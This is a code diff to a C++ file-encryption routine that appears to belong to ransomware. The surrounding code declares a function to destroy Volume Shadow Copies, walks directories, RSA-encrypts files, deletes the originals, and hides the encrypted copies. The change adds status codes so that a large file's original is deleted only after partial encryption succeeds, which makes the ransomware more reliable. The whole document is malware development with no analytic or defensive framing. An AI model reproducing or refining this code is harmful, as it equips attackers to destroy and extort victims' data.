@@ -19,7 +19,7 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 void changeHiddenFileState(bool state);
 void destroyVSS();
 
-void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor);
+Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor);
 static void iterate(const path& parent,
 	RsaEncryptor& rsaEncryptor,
 	std::vector<string>& processedPaths);
@@ -556,7 +556,7 @@ static void iterate(const path& parent,
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		try {
 			path = itr->path().string();
-			std::cout << "handling " << path << std::endl;//DEBUG PRINT
+			//std::cout << "handling " << path << std::endl;//DEBUG PRINT
 			string ending(path.begin() + path.size() - 3, path.end());
 			bool lnkFile = false;
 
@@ -581,8 +581,8 @@ static void iterate(const path& parent,
 			else if(file_size(path) > MAX_FILE_SIZE && !hasNonEncryptAttribute(path) &&
 				path.find(PART_LOCKED_EXT) == string::npos) //not yet encrypted big file that isn't hidden or system file
 			{
-				partialEncrypt(path, rsaEncryptor);
-				remove(path);
+				if(NT_SUCCESS(partialEncrypt(path, rsaEncryptor)))
+					remove(path);
 			}
 			else {
 				if (!do_encrypt(path)) continue;
@@ -615,7 +615,7 @@ static void iterate(const path& parent,
 	}
 }
 
-void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
+Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 {
 	PBYTE plaintext = nullptr;
 	PBYTE key = nullptr;
@@ -636,6 +636,7 @@ void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 	DWORD cipherSize = 0;
 	DWORD resSize = 0;
 	boost::filesystem::path path_path = path;
+	Status status = STATUS_UNSUCCESSFUL;
 	if (!GetDiskFreeSpaceEx(path_path.parent_path().string().c_str(), &freeSpace, NULL, NULL)) {
 		goto PART_ENC_CLEANUP;
 	}
@@ -723,8 +724,10 @@ void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 		size_t currentPlace = outFile.tellp();
 		outFile.close();
 		//	read rest of file and write it (just go over the file in some manner)
-		myCopyFiles(path, 2 * sz, fileSize, path + PART_LOCKED_EXT, currentPlace);
+		if (!myCopyFiles(path, 2 * sz, fileSize, path + PART_LOCKED_EXT, currentPlace))
+			goto PART_ENC_CLEANUP;
 		makeFileHidden(path + PART_LOCKED_EXT);
+		status = STATUS_SUCCESS;
 	}
 	else 
 	{
@@ -734,7 +737,7 @@ void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 		//	total shift of 146 bytes.
 		//  go over file from end to beginning and shift data in 146B up to the 100MB line.
 		//  encrypt the 2nd 50 MB  block. 
-		return;
+		return STATUS_UNSUCCESSFUL;//to avoid removing the file
 		//but we don't have time to implement, so skip
 	}
 PART_ENC_CLEANUP:
@@ -762,6 +765,6 @@ PART_ENC_CLEANUP:
 		HeapFree(GetProcessHeap(), 0, keyIvBuffer);
 	if (restBuffer)
 		delete[] restBuffer;
-	return;
+	return status;
 }
 
